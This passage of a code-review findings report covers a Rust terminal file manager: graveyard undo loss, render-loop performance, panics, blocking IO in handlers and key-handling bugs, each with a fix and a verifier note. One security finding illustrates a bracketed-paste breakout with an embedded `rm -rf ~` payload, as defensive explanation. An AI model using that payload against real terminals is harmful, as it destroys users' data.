+check() at health.rs:24 runs check_paired_dir on the graveyard directory. check_paired_dir (health.rs:36-97) only recognizes the extensions "json" and "dat"; a `<uuid>.tar.zst` payload falls into the `_ => {}` arm (extension() returns "zst", and its file_stem is "<uuid>.tar" anyway). So for every valid post-v1.41.0 graveyard entry, the `<uuid>.json` lands in `jsons`, `dats` stays empty, and the jsons.difference(&dats) loop at health.rs:73-77 removes the metadata file as an "orphan". The check runs on every launch from bootstrap.rs:82-87, before Graveyard::load. Net effect: all soft-delete undo entries are silently destroyed at the next spyc start (Graveyard::load drops entries with no .json), and the now-unreferenced .tar.zst tarballs are never cleaned up (health only removes orphaned .dat), accumulating until check_graveyard_size starts warning at 100 MB. This directly contradicts the module's own claims — graveyard.rs:217-219, 245-246 and 320-321 say orphaned tarballs are "cleaned up by the next health check" — and ARCHITECTURE.md's "State persistence (XDG)" section which documents the graveyard as `<uuid>.json` + `<uuid>.tar.zst` pairs. The existing health test `orphaned_json_cleaned_up` proves the deletion behavior for json-without-dat; it was simply never updated for the graveyard's tar.zst migration.
+
+**Fix:** Teach check_paired_dir (or a graveyard-specific variant) the real pairing: in the graveyard dir a metadata json's payload is `<stem>.tar.zst`, in the inventory dir it is `<stem>.dat`. Pair by stripping the full ".tar.zst" suffix from file names rather than relying on Path::extension. Add a regression test that writes a valid `<uuid>.json` + `<uuid>.tar.zst` pair into graveyard/ and asserts check() leaves both untouched, and one asserting an orphaned .tar.zst IS removed.
+
+> verifier: duplicate of health.rs:73 — same root cause
+
+### `src/state/health.rs:73` — Startup health check deletes every valid graveyard metadata file, permanently breaking undo
+`high` · `correctness` · `state-sessions` · **confirmed**
+
+check() calls check_paired_dir(&state_dir.join("graveyard"), ...) (health.rs:24), which pairs `<stem>.json` with `<stem>.dat` only (extensions matched at lines 50/62). But the graveyard schema since v1.41.0 is `<uuid>.json` + `<uuid>.tar.zst` (graveyard.rs:24-27, write_entry_as at graveyard.rs:164-165). A `.tar.zst` payload has extension `zst` and file_stem `<uuid>.tar`, so it lands in the `_ => {}` ignore arm and never enters the `dats` set. Consequently every valid graveyard `.json` appears in `jsons.difference(&dats)` and is removed at lines 73-77 on the next launch. Effects: (1) all `R`-deleted entries vanish from the graveyard viewer, so the advertised one-keystroke undo is impossible after any restart; (2) the orphaned `.tar.zst` payloads are unreachable (read_entries skips json-less tarballs, graveyard.rs:324) and are never cleaned by anything, leaking disk forever — they are also invisible to the 500MB cascade cap because total_bytes() sums only loaded entries; (3) the user gets a misleading "graveyard: cleaned up N orphaned file(s)" flash. Empirically confirmed on this machine: ~/.local/state/spyc/graveyard currently holds 28 orphaned `.tar.zst` files with zero matching `.json` (the only surviving `.json` files pair with pre-v1.41.0 `.dat` files, exactly as the bug predicts). check_paired_dir runs unconditionally at every App::new (src/app/bootstrap.rs:82-83), before Graveyard::load.
+
+**Fix:** Parameterize check_paired_dir with the payload suffix ("dat" for inventory, "tar.zst" for graveyard) and match payload stems by stripping that full suffix (file_stem alone yields `<uuid>.tar`). Add a graveyard pair test mirroring the inventory ones. Consider a recovery path for users already bitten: re-index orphaned `.tar.zst` files into minimal Entry metadata instead of leaving them stranded.
+
+> verifier: hand-verified: graveyard writes <uuid>.json + <uuid>.tar.zst; health check_paired_dir only pairs json/dat, deletes new-format .json as orphans. Live evidence: 29 tar.zst vs 7 json in ~/.local/state/spyc/graveyard
+
+### `src/ui/list_view.rs:173` — Grid computation scans every listing row from view_top to END of list, on every frame
+`high` · `perf` · `app-render` · **confirmed**
+
+`ListView::grid` does `let tail = &self.rows[tail_start..]; let widths: Vec<usize> = tail.iter().map(|row| display_width(&row.display)).collect();` — it computes Unicode display widths and allocates a Vec for ALL rows from view_top to the end of the listing, even though the column loop below breaks after the handful of columns that fit on screen. This runs on the render thread on EVERY frame: `Widget for ListView::render` calls `self.grid(area)` unconditionally (src/ui/list_view.rs:225, reached from the assigned src/app/render/inner.rs:178), bypassing the `cached_grid_key` guard in `settle_list_grid` — that guard only caches the settle-side probes (src/app/render/mod.rs:337), which themselves re-run this O(n) scan up to 5 times per cursor move (the stabilization loop probes per round). Concrete scaling: a 100k-entry directory with the cursor near the top (view_top=0) does 100k `display_width` calls plus an ~800KB Vec<usize> allocation per frame; while an agent pane streams output (continuous redraws) or during j/k key-repeat this is tens of ms of main-thread CPU per frame — exactly the typing-jank regression class the owner has chased before, and it grows linearly with directory size.
+
+**Fix:** Compute column widths lazily column-by-column inside the existing loop (take the max of each `rows_per_col` slice as you go) and stop as soon as the width budget is exhausted — bounds work to O(items_per_page + one overflow column) instead of O(total rows). Additionally, cache the full `Grid` (incl. col_widths) in ViewState keyed by the existing `cached_grid_key` so the draw pass reuses the settle pass's result instead of recomputing per frame.
+
+> verifier: confirmed: The defect exists as described. (1) src/ui/list_view.rs:171-177: `grid()` eagerly collects `display_width` into a `Vec<usize>` for ALL rows from view_top to the end of the listing; the column loop below breaks after the columns that fit, so most of the Vec is wasted work (except the narrow-screen `col_idx==0` fallback, which reads the whole-tail max). (2) The draw path is uncached: `Widget for ListView::render` calls `self.grid(area)` unconditionally (list_view.rs:225), invoked per frame from render_inner.rs:178 with `rows = view.cached_rows`, which `build_rows` (chrome.rs:305) buil …
+
+### `src/ui/pager/selection.rs:325` — yank_visual_to_clipboard can panic: `lo` is never clamped after the buffer shrinks under an active visual selection
+`high` · `correctness` · `ui-pager` · **confirmed**
+
+`yank_visual_to_clipboard` clamps only the high end: `let hi = hi.min(self.lines.len().saturating_sub(1));` then slices `self.lines[lo..=hi]` (both Line and Block arms). `lo` is unclamped, so if both anchor and cursor sit beyond the current end of `lines`, `lo > hi` and the slice panics ('slice index starts at X but ends at Y'), crashing the whole TUI. This is reachable: visual mode is enterable in the live task viewer (`V` falls through to `handle_pager_motion` for any pager, including views with `task_id`), and while visual mode is active the tick loop still runs `refresh_task_viewer` (src/app/streaming.rs:282), which replaces `view.lines` wholesale from the task buffer. That buffer is front-trimmed at TASK_BUFFER_CAP = 1 MiB (src/app/streaming.rs:231-234), so the rebuilt line count can shrink (e.g. many short lines dropped from the front, one long line appended). Repro: run a chatty background task that exceeds 1 MiB of output, open its viewer, G then V to anchor near the bottom, wait while it streams, press y → panic. Even when it doesn't panic, the selection and any `Search::Active` match indices silently point at different lines after every refresh, so `y` yanks lines the user never selected.
+
+**Fix:** In `yank_visual_to_clipboard`, clamp `lo` as well and return Ok(0) when `self.lines.is_empty()` or `lo > hi` after clamping. Better: invalidate (or clamp) `visual`, `placement`, and active search match indices at every site that replaces `view.lines` (refresh_task_viewer, the capture drain, apply_exit_event).
+
+> verifier: hand-verified: lo never clamped after hi.min(); head-truncating streaming buffers can shrink lines below lo -> slice panic
+
+## Medium severity
+
+### `src/agent/resume.rs:24` — Claude resume stripper misses -r/--continue/-c and eats the flag following a bare --resume
+`medium` · `correctness` · `mcp-agent` · **unverified**
+
+command_without_resume only handles the literal token `--resume` and unconditionally consumes the NEXT token as its value (resume.rs:24-27). The claude CLI also accepts `-r [id]`, `--continue`, `-c`, and `--resume` with NO argument (interactive picker). Two concrete failures: (1) a pane spawned as `claude -r <uuid>`: at save time the baseline keeps `-r <uuid>` untouched; at restore, ClaudeProfile::reconstruct_restore (src/agent/mod.rs:172-184) spawns `claude -r <uuid>` — resuming the OLD session — and then the event loop's ClaudeStdin dance types `/resume <new-sid>` into it (or, for bare `claude -r`, types into the interactive resume picker's filter box, garbling it). (2) `claude --resume --dangerously-skip-permissions`: skip_next eats `--dangerously-skip-permissions` as if it were the session id, so the restored command is bare `claude` and the user's permissions flag is silently dropped. Compare command_without_gemini_resume (resume.rs:114) and command_without_zot_resume (mod.rs:373), which both handle short/no-arg/`=` forms.
+
+**Fix:** Strip `-r`, `--continue`, `-c`, and `--resume=<id>` as well, and only consume the following token as the session id when it does not start with '-' (claude's resume argument is optional).
+
+### `src/agent/resume.rs:298` — gemini_resume_index_for runs `gemini --list-sessions` synchronously with no timeout on the session-restore path
+`medium` · `correctness` · `mcp-agent` · **unverified**
+
+GeminiProfile::reconstruct_restore (src/agent/mod.rs:291) calls gemini_resume_index_for, which does `Command::new("gemini").arg("--list-sessions").output()` (resume.rs:298-302) with no timeout. Session restore runs on the main event-loop thread, so every restored gemini tab blocks the UI for the gemini CLI's node startup (typically 1-3 s), and if gemini wedges — e.g. it blocks on an auth/network prompt or a first-run interactive question with no TTY input — `output()` blocks indefinitely and spyc hangs at startup restore with no way to interrupt. This is the exact "blocking IO on the render/input path" class the codebase has been systematically removing.
+
+**Fix:** Bound the subprocess (spawn + wait with a deadline, killing on expiry) or resolve the index off-thread and decorate the spawn command when the result arrives, falling back to the bare `gemini` spawn on timeout exactly as it already does on lookup failure.
+
+### `src/app/agent_status.rs:80` — active_agent_status spawns OS threads and mutates Runtime atomics from inside the pure draw pass
+`medium` · `maintainability` · `app-render` · **confirmed**
+
+`active_agent_status` is called from `render_inner` (src/app/render/inner.rs:161), squarely inside the draw pass the contract declares pure ('Render is pure (&self) … mutates nothing; any pre-frame state settling happens in prepare_frame'). Yet under `&self` it uses interior mutability to `store` `runtime.agent_status_refreshing` (line 72), writes the shared `agent_status_pending` slot, and calls `std::thread::spawn` (line 80) — OS access from render, exactly the 'don't reach for the OS inside … the render pass' violation. The *apply* side was already correctly moved to the pre-recv scan (`apply_landed_agent_status`); only the refresh *kick* still fires mid-draw. It works today, but it erodes the invariant that makes render snapshot-testable and means a TestBackend snapshot render can silently spawn worker threads that walk ~/.claude/sessions.
+
+**Fix:** Split the function: a pure `&self` read of the cache for the draw, and move the staleness check + thread kick into `prepare_frame` (the designated &mut pre-draw settle point) or the pre-recv scan that already owns `apply_landed_agent_status` — keeping the kick and the apply in the same place would also let the comments stop explaining why they're split.
+
+> verifier: confirmed: Verified against the code: active_agent_status (src/app/agent_status.rs:17) is &self, called from the draw pass at src/app/render/inner.rs:161, and under &self it stores the runtime.agent_status_refreshing atomic (line 72) and calls std::thread::spawn (line 80); the spawned worker walks ~/.claude/sessions and writes agent_status_pending. CLAUDE.md explicitly forbids this ("Render is pure (&self) … mutates nothing"; "don't reach for the OS inside a handler or the render pass"), and ARCHITECTURE.md even claims the "mutation-free render" purity pass is done — contradicted by this code. …
+
+### `src/app/clipboard.rs:189` — pipe_content_to_pane does unbounded blocking file reads inline in the input handler
+`medium` · `perf` · `app-render` · **confirmed**
+
+`^W p` runs `std::fs::read_to_string(path)` for every selected file directly inside the update handler (not behind an Effect), with no size cap, and accumulates everything into one in-memory `payload` String that's then cloned into a single bracketed-paste byte Vec (line 207). Picking a directory's files when one is a multi-GB log/JSONL that happens to be valid UTF-8 blocks the main loop for the full disk read (seconds on network filesystems), then doubles the allocation for the paste buffer — the exact 'blocking IO on the input path' class the owner has flagged as fix-now. The inventory branch (line 161) has the same shape via `inventory.read_content`. It also bends the CLAUDE.md 'handlers never touch the OS; side effects are Effect data' rule — the disk read happens in the handler, only the pty write is an Effect.
+
+**Fix:** Cap per-file size (e.g. stat first and skip files over a few MB with a `skipped` count, matching the existing binary-skip UX), and move the reads into the Effect executor or an off-thread worker that posts the assembled payload back as a Message.
+
+> verifier: confirmed: Verified against the code. (1) src/app/clipboard.rs:189 does `std::fs::read_to_string(path)` per selected file with no size cap, inside `pipe_content_to_pane`, which is invoked synchronously from the action dispatcher (src/app/actions.rs:408-409) on the main update loop — blocking disk IO on the input path; only the pty write is an Effect. (2) Line 207 builds the bracketed-paste Vec with `payload.len()+12` capacity while `payload` is still alive, so peak memory is ~2x content size. (3) The inventory branch (line 161) calls `Inventory::read_content` (src/state/inventory.rs:181-185),  …
+
+### `src/app/clipboard.rs:250` — Clipboard/file-op handlers do blocking filesystem IO inline instead of returning Effects
+`medium` · `maintainability` · `app-render` · **confirmed**
+
+Three handlers on the key/prompt input path perform direct disk IO inside the handler, contra 'handlers return Vec<Effect> and never touch the OS directly': `run_selection_to` runs `op(&paths, &dest)` (a recursive copy/move from fs::ops) synchronously at line 250 — copying or moving a large selection freezes the entire UI (no pane redraws, no input) for the duration; `pipe_content_to_pane` does `std::fs::read_to_string` per selected file at line 189 (a huge file or a FIFO/network mount blocks the loop); `put_inventory_to_cwd` calls `self.state.inventory.put_to(&dest)` at line 68, which performs `std::fs::copy` loops from inside the Model (src/state/inventory.rs:144). This is the known 'blocking IO on the render/input path' class the project has been systematically moving off-thread, and it will bite heavy-files daily users.
+
+**Fix:** Route these through Effects executed by `run_effects` (e.g. `Effect::CopyMoveSelection`, `Effect::PipeFilesToPane`), and for the copy/move case consider reusing the existing background-task machinery so multi-GB operations report progress instead of freezing the loop.
+
+> verifier: confirmed: Verified all three cited sites: clipboard.rs:250 runs fs::ops::copy_selection_to/move_selection_to (recursive copy_tree/move_tree) synchronously on the event-loop thread, reachable from the copy/move prompts (prompt.rs:512/516, key_dispatch/mod.rs:519/522); clipboard.rs:189 does unguarded std::fs::read_to_string per selected file; clipboard.rs:68 → inventory.put_to → std::fs::copy loops (inventory.rs:144) inside the Model type. None use Effects or off-thread machinery, so a large copy/move does freeze rendering and input — the exact blocking-IO-on-input-path class the project's stan …
+
+### `src/app/commands.rs:83` — `:;cmd` and `:!cmd` arms are near-verbatim copies of the ShellCmd / ShellCmdCaptured prompt arms
+`medium` · `maintainability` · `app-input` · **confirmed**
+
+commands.rs lines 83-105 (`:;<cmd>` → expand_percent, top_overlay_size, cwd clone, make_pane_wake, Pane::spawn, set runtime.top_overlay + Focus::Overlay, identical "spawn: {e}" flash) duplicates prompt.rs dispatch_prompt's PromptKind::ShellCmd arm (lines 478-494) line for line. Likewise commands.rs lines 57-80 (`:!!`/`:!<cmd>` → last_captured_cmd bookkeeping + expand_percent + start_capture) duplicates the PromptKind::ShellCmdCaptured arm (prompt.rs lines 495-509) including the repeat-last-command special case, expressed two different ways (`input == "!!"` vs `buffer.trim() == "!"`). Any fix to overlay sizing, focus handling, or percent expansion must now be made twice; the two copies have already drifted cosmetically (the `:`-side repeat accepts both `!` and `!!`, the prompt side only `!`).
+
+**Fix:** Extract two shared App helpers, e.g. spawn_overlay_command(&str) and run_captured_command(&str), and call them from both the colon-command arms and the prompt arms.
+
+> verifier: confirmed: Verified against the actual code; every factual claim in the finding holds.
+
+1. Duplication is real and near-verbatim. /Users/derekmarshall/src/spyc/src/app/commands.rs:83-105 (`:;<cmd>` arm) performs exactly the sequence the finding lists — `crate::shell::expand_percent(...)`, `Self::top_overlay_size(self.effective_pane_pct(), self.runtime.pane_tabs.is_some())`, `self.state.listing.dir.clone()`, `self.make_pane_wake()`, `Pane::spawn(&expanded, rows, cols, &cwd, &self.view.context_path, wake)`, `self.runtime.top_overlay = Some(p)` + `self.state.focus = Focus::Overlay`, and the ident …
+
+### `src/app/effect.rs:274` — Stale PostAction shim: PostAction::None is dead and its justifying comment cites code that no longer typechecks
+`medium` · `maintainability` · `app-mvu-state` · **confirmed**
+
+The doc comment on `impl From<PostAction> for Vec<Effect>` (effect.rs:271-275) says the conversion must exist because "there is a live `ApplyResult::Post(PostAction::None)` site" — but `ApplyResult::Post` now carries `Vec<Effect>` (src/app/state/mod.rs:68), so that expression cannot compile, and grep confirms `PostAction::None` is never constructed in production code (only in the From impl itself and its test). The whole `PostAction` enum (src/app/mod.rs:173) survives as a Phase-1 shim: its four remaining `Spawn` builder sites (apply.rs:164, navigate.rs:247, prompt.rs:571, mod.rs:1026) each immediately convert via `.into()`.
+
+**Fix:** Delete `PostAction` and the `From` impl; have the four sites construct `vec![Effect::ForegroundExec { .. }]` directly (or a small `Effect::foreground_exec(program, args, pause_after)` constructor). At minimum, correct the false comment and remove the dead `None` variant.
+
+> verifier: confirmed: Every factual claim verifies. (1) The doc comment at src/app/effect.rs:271-275 justifies `From<PostAction> for Vec<Effect>` by citing "a live `ApplyResult::Post(PostAction::None)` site", but `ApplyResult::Post` carries `Vec<Effect>` (src/app/state/mod.rs:68), so that expression cannot compile, and grep confirms `PostAction::None` is constructed only inside the From impl itself (effect.rs:279) and its test (effect.rs:554) — the comment is false today. (2) `PostAction` (src/app/mod.rs:173) has exactly four production construction sites, all `Spawn` and each immediately `.into()`-conve …
+
+### `src/app/effect.rs:483` — Foreground spawn failure aborts the entire app (and skips resume_tui)
+`medium` · `correctness` · `app-mvu-state` · **confirmed**
+
+Effect::ForegroundExec is the one arm that `?`-propagates: `fg.run(terminal, &program, &args, pause_after)?` (src/app/effect.rs:483). Inside run_child_in_foreground, `let mut child = cmd.spawn()?` (src/app/proc.rs:234) returns Err after suspend_tui has already run but before resume_tui, so the error path leaves the TUI torn down; the error then propagates through run_effects → the run loop (`?` at src/app/run.rs:219/223) and App::run exits. Concrete trigger: $VISUAL/$EDITOR set to a missing binary (typo, or `code --wait` without code on PATH — resolve_editor at src/shell/mod.rs:17 passes it through verbatim) and pressing the edit key, or `:setenv SHELL=/bad/path` then `s`. Result: the whole file manager terminates mid-session, killing every pty pane (live agent conversations die via PtyHost Drop) because of a config typo — where every other effect arm deliberately flashes and survives.
+
+**Fix:** Treat child-spawn failure as recoverable: in run_child_in_foreground, attempt resume_tui before returning the spawn error (or spawn before suspend_tui), and in run_effects convert a ForegroundExec spawn failure into a flash_error instead of `?`-propagating, reserving propagation for genuine terminal-restore failures.
+
+> verifier: confirmed: The finding holds as stated; every refutation angle I tried failed.
+
+1. Code does what the finding claims. /Users/derekmarshall/src/spyc/src/app/proc.rs: `run_child_in_foreground` calls `suspend_tui(terminal)?` (line 220), then `let mut child = cmd.spawn()?` (line 234); `resume_tui` is only at line 276. A spawn failure (ENOENT — Rust's spawn does report missing binaries as Err at spawn time on Unix) returns Err after the TUI is suspended and before resume. `ForegroundExec::run` (proc.rs:195-197) unparks the reader but passes the Err through.
+
+2. It is the unique propagating arm. eff …
+
+### `src/app/effect.rs:501` — Pager edit round-trip silently discards edits and deletes the temp file when read-back fails
+`medium` · `correctness` · `app-mvu-state` · **confirmed**
+
+In the ForegroundExec after-work, the PagerReturn::TempFile arm does `if let Ok(content) = std::fs::read_to_string(&path)` (src/app/effect.rs:501) and then unconditionally `let _ = std::fs::remove_file(&path)` (line 511). std::fs::read_to_string fails on any non-UTF-8 content, so if the user edits a saveable pager buffer via $EDITOR and the editor writes bytes that aren't valid UTF-8 (latin-1 paste, copied binary fragment) — or any transient IO error occurs — the pager is not restored, no error is flashed, and the temp file holding the user's just-saved edits is deleted. The edits are irrecoverably lost with zero feedback.
+
+**Fix:** On read failure, flash an error naming the temp path and skip the remove_file so the user can recover their edits manually; or read with std::fs::read + String::from_utf8_lossy so non-UTF-8 saves still round-trip.
+
+> verifier: confirmed: The code at src/app/effect.rs:501-511 matches the finding exactly: `if let Ok(content) = std::fs::read_to_string(&path)` with no else/flash, followed by an unconditional `let _ = std::fs::remove_file(&path)`. The path is reachable: pressing `v` on a pager view without a source_path (src/app/pager_handler/motion.rs:281-310) writes the buffer to a temp file (write_to_temp, src/ui/pager/construct.rs:124) and launches $EDITOR; on return this arm is the sole consumer of pending_pager_return. The pager was already cleared before launching the editor, so on read failure (non-UTF-8 editor o …
+
+### `src/app/find_picker.rs:55` — F-finder streaming batches reset the user's selection to 0, racing Enter to the wrong file
+`medium` · `correctness` · `app-input` · **confirmed**
+
+FindPicker::refilter (lines 50-56) always does `self.selected = 0`. It is called both on keystrokes (where the reset is correct) and from the run loop's walker drain (src/app/run.rs:468-474) every time the background walk delivers a batch or completes. On a large repo the walk streams for seconds: while the user arrows Down to highlight a match, each arriving batch yanks the highlight back to row 0. Concrete failure: user types a query, presses Down twice to select the 3rd result, a batch lands (selected := 0, list possibly re-ordered), and the Enter they were already pressing opens `filtered[0]` — a different file from the one that was highlighted a frame earlier. Even without the Enter race the cursor visibly snaps to the top repeatedly during the scan.
+
+**Fix:** On the drain path, preserve the selection: remember the currently selected PathBuf before refilter, and after re-ranking set `selected` to its new position (falling back to 0 only if it dropped out). Reset to 0 only when the query itself changed.
+
+> verifier: confirmed: Verified directly in code. (1) `FindPicker::refilter` (src/app/find_picker.rs:55) unconditionally sets `selected = 0`. (2) The run loop (src/app/run.rs:468-474) calls `refilter()` on every drained walker batch — batches are 256 paths (STREAM_BATCH, src/fs/finder.rs:39), so on a large repo the loop refilters many times over a multi-second scan; additionally `drain_walk` returns true on channel Disconnected (find_picker.rs:74-78), so the selection is reset one final time at walk completion too. (3) Up/Down (find_picker.rs:211-228) mutate `selected` with no preservation across refilter …
+
+### `src/app/key_dispatch/mod.rs:32` — Pasted text is wrapped in bracketed-paste markers without stripping an embedded end-marker, enabling paste-injection into the child pane
+`medium` · `security` · `app-input` · **confirmed**
+
+`bracketed_paste(text)` wraps the raw paste payload verbatim between `\x1b[200~` and `\x1b[201~` (lines 33-37) and the result is forwarded to a child pty via `Effect::SendToPane` in two places in `handle_paste`: the `OverlayPty` arm (line 424) and the `BottomPane` arm (line 439). The payload is never scanned for an embedded `\x1b[201~`. If pasted content contains that end marker, the receiving child (claude/codex/shell) sees the paste terminate early and treats every byte after it as live keystrokes — the classic bracketed-paste breakout. In this app's threat model that is meaningful: a user copies poisoned text from a malicious source (web page, file) and pastes it into the bottom pane; embedded `\x1b[201~\nrm -rf ~\n` escapes the paste block and runs in their shell/agent. The same un-sanitized wrap is duplicated in `pipe_content_to_pane` (src/app/clipboard.rs:206-208), which reads arbitrary on-disk file content and is an even cleaner injection vector since file bytes are fully attacker-controlled.
+
+**Fix:** Before wrapping, strip (or neutralize) any occurrence of the bracketed-paste end marker `\x1b[201~` (and ideally the start marker `\x1b[200~`) from the payload, e.g. `text.replace("\x1b[201~", "")`. Apply the same sanitization in `pipe_content_to_pane`.
+
+> verifier: confirmed: The finding identifies a genuine, reachable, unsanitized bracketed-paste injection vector, though only one of its two claimed paths actually holds.
+
+(1) The keyboard-paste path it leads with (key_dispatch/mod.rs:424, 439) is effectively defended. The `text` passed to `bracketed_paste()` comes from `Event::Paste` (run.rs:221), produced by crossterm 0.29's `parse_csi_bracketed_paste` (parse.rs:812-822), fed byte-by-byte by `Parser::advance` (mio.rs:198). That parser emits a Paste event as soon as the buffer `ends_with(b"\x1b[201~")` and then clears the buffer, so a single Paste event' …
+
+### `src/app/key_dispatch/mod.rs:227` — Inventory/Graveyard view key arms match key.code only, so Ctrl-chords trigger destructive view verbs
+`medium` · `correctness` · `app-input` · **confirmed**
+
+The Inventory special-case in handle_key matches `KeyCode::Char('x' | 'd')`, `Char(' ' | 't')`, and `Char('p')` (lines 227, 231, 239) without checking key.modifiers, and it runs before the resolver. The resolver binds Ctrl+D to Action::Quit, Ctrl+T to PickToggleAll, and Ctrl+X to ChmodAdd('x') (src/keymap/resolver/mod.rs:142-155). So in Inventory view, a user pressing ^d to quit (or ^x for chmod) instead silently removes the inventory entry under the cursor via drop_cursor; ^t toggles one entry and moves the cursor; ^p runs put_inventory_to_cwd (copies files into cwd). Worse, line 249 unconditionally forwards ALL graveyard-view keys to handle_graveyard_view_key (src/app/graveyard.rs:84-97), which has the same modifier-blind matching: pressing ^d twice in the graveyard (the natural retry after Quit appears to do nothing) purges the cursor entry to system trash, and a single ^x purges immediately with no confirm. The graveyard view also eats every meta chord (^a-j, ZZ, :), contradicting the route.rs 'meta chords always escape' design.
+
+**Fix:** Guard the Inventory/Graveyard char arms with `key.modifiers.is_empty()` (or at least `!key.modifiers.contains(KeyModifiers::CONTROL)`), letting modified keys fall through to the resolver so ^d/^x/^t keep their global meanings; apply the same fix to handle_graveyard_view_key and consider letting meta chords escape the graveyard view.
+
+> verifier: confirmed: Every specific claim checks out. (1) src/app/key_dispatch/mod.rs:221-244 matches Inventory keys on key.code only — Char('x'|'d') → drop_cursor, Char(' '|'t') → toggle_pick+move, Char('p') → put_inventory_to_cwd — with no modifiers check, and these arms run before resolver.feed (line 252). Crossterm delivers ^d as KeyCode::Char('d')+CONTROL, so Ctrl chords match. (2) The resolver bindings are exactly as claimed (src/keymap/resolver/mod.rs:142 Ctrl+D→Quit, 146 Ctrl+T→PickToggleAll, 155 Ctrl+X→ChmodAdd('x')), so in Inventory view ^d silently drops the entry instead of quitting. (3) Lin …
+
+### `src/app/key_dispatch/mod.rs:315` — Capture-pty writes bypass the Effect executor while sibling sinks in the same match use Effect::SendToPane
+`medium` · `maintainability` · `app-input` · **confirmed**
+
+In handle_key, the InputSink::OverlayPty and InputSink::BottomPane arms return Effect::SendToPane and let run_effects do the OS write (the comments call it "the sole executor"). But the InputSink::Capture arm calls handle_capture_key, which writes directly: `capture.host.writer.write_all(&bytes); capture.host.writer.flush()` (lines 315-316), plus inline `child.kill()`/`child.wait()` at lines 286-287. handle_paste's Capture arm repeats the inline write at lines 378-379. So the same routing match has two of three pty destinations going through the executor and one reaching the OS from inside the handler — drift from the "handlers return Vec<Effect> and never touch the OS directly" invariant, and a blocking write on the input thread if the capture child's pty buffer is full (e.g. a stopped/slow child).
+
+**Fix:** Add a PaneTarget::Capture (or a dedicated Effect::SendToCapture) so capture keystrokes/pastes/kill flow through run_effects like the other two pty targets; handle_capture_key then becomes pure state transitions + effect construction.
+
+> verifier: confirmed: The finding is factually accurate and the contract violation is real. Verified in src/app/key_dispatch/mod.rs: the OverlayPty (lines 158-167) and BottomPane (lines 179-211) arms of the route_input match return Effect::SendToPane for run_effects to execute, while the Capture arm (line 150) delegates to handle_capture_key which writes directly to the OS — capture.host.writer.write_all/flush at lines 315-316 and inline child.kill()/child.wait() at lines 286-287. handle_paste repeats the pattern: its Capture arm writes directly at lines 378-379 while its OverlayPty/BottomPane arms use E …
+
+### `src/app/key_dispatch/prompts.rs:200` — Tab-completion PromptKind allowlists are hand-synced in three-plus places — the drift pattern the command table was built to kill
+`medium` · `maintainability` · `app-input` · **confirmed**
+
+Which prompt kinds get path completion is encoded as separate hand-maintained matches: prompts.rs lines 86-96 (simple-prompt Tab: Jump|CopyTo|MoveTo|MakeDir|NewFile|PaneNewTabCwd), prompts.rs lines 200-214 (vi-prompt Tab: the same six plus ShellCmd|ShellCmdCaptured|Command), prompt.rs tab_complete_path lines 110-116 (its own is_shell/is_jump/is_command re-derivation), and is_path_prompt_kind in app/mod.rs line 311 (the history-suppression list). Adding a new path-taking PromptKind requires touching three or four lists or completion/history silently misbehaves — exactly the "hand-synced trio" footgun the module docs (command_table.rs lines 55-60) describe eliminating for `:`-commands.
+
+**Fix:** Give PromptKind a single source of truth, e.g. methods `fn completes_path(&self) -> bool` / `fn is_shell_style(&self) -> bool` / `fn history_bucket(&self)` (the last already exists as history_bucket_for), and have all dispatch sites consult those instead of local kind lists.
+
+> verifier: confirmed: Every factual claim verified against the code. (1) prompts.rs:85-96 simple-prompt Tab allowlist and prompts.rs:200-214 vi-prompt Tab allowlist both exist with exactly the claimed kind lists; prompt.rs:106-116 tab_complete_path independently re-derives is_shell/is_jump/is_command; mod.rs:311 is_path_prompt_kind holds a fourth kind list gating history nav (prompts.rs:347/369). (2) The drift hazard is real, not theoretical: checking all Prompt::simple/Prompt::shell constructions shows 5 of 6 kinds in the simple-Tab list are unreachable there (they're vi prompts) and NewFile is dead in  …
+
+### `src/app/mcp.rs:174` — MCP PickFiles applies picks for valid patterns, then reports total failure and skips write_context
+`medium` · `correctness` · `app-render` · **confirmed**
+
+In `execute_mcp_command`, `McpCommand::PickFiles` iterates all patterns, inserting picks for every valid pattern as it goes (mcp.rs:160-172), then — if ANY pattern was invalid — returns `McpResponse::Error` at line 174-177 without calling `self.write_context()` or flashing. So for `patterns = ["*.rs", "[bad"]` the Model has already picked every .rs file and `list_generation` was bumped (the UI shows them picked), but the MCP client is told the call failed ("invalid patterns: ..."), and the on-disk context file the client reads via get_spyc_context is left stale until some unrelated debounced write fires. The agent's view ("nothing was picked") and spyc's actual state (files picked) diverge — an agent that retries with corrected patterns will silently double-up picks it believes don't exist. Every other mutating arm pairs the mutation with `write_context()`; this early-return is the one path that mutates without it.
+
+**Fix:** Either validate all patterns up front and return the error before mutating anything (cleanest — makes the command atomic), or on the partial path call `self.write_context()` and return an Ok/partial response that reports both the picked count and the bad patterns.
+
+> verifier: confirmed: CONFIRMED with one minor inaccuracy noted.
+
+Verified against /Users/derekmarshall/src/spyc/src/app/mcp.rs:157-185:
+
+1. The code does exactly what the finding claims. The PickFiles arm inserts picks for every valid pattern as it iterates (lines 160-172), bumps `list_generation` unconditionally (line 173, so the UI re-renders with the new picks), and then — if `errors` is non-empty — returns `McpResponse::Error { "invalid patterns: ..." }` at lines 174-177 without calling `self.write_context()` or flashing. For `["*.rs", "[bad"]`, every .rs entry is picked, the UI shows it, and the cl …
+
+### `src/app/mod.rs:793` — crossterm::terminal::size() called inside key/action handlers (8 sites), against the effects-as-data contract
+`medium` · `maintainability` · `app-loop` · **confirmed**
+
+open_help (mod.rs:793) — reached from the Action::Help handler in actions.rs:228 and from graveyard.rs:43 / key_dispatch/mod.rs:491 — calls crossterm::terminal::size() directly. The same direct terminal query, each with its own duplicated `unwrap_or((80, 24))` fallback, appears in 7 more handler-path sites: pane_tabs.rs:423/441/454, tasks.rs:724, git_view_session.rs:146, pane_scroll.rs:177, pager_handler/mod.rs:103/397. CLAUDE.md's contract says handlers "never touch the OS directly" — this is a read-only ioctl rather than a side effect, but it is still OS access scattered through handler code, untestable without a tty, and the app already learns the size authoritatively via Event::Resize (handle_resize, key_dispatch/mod.rs:468) and the drawn frame area in render_frame.
+
+**Fix:** Cache the last-known (cols, rows) on ViewState — seeded once at startup, updated by handle_resize and/or render_frame's frame.area — and have all 8 sites read that. Removes the OS call from handler paths, kills the 8 duplicated (80, 24) fallbacks, and makes width-dependent handler logic unit-testable.
+
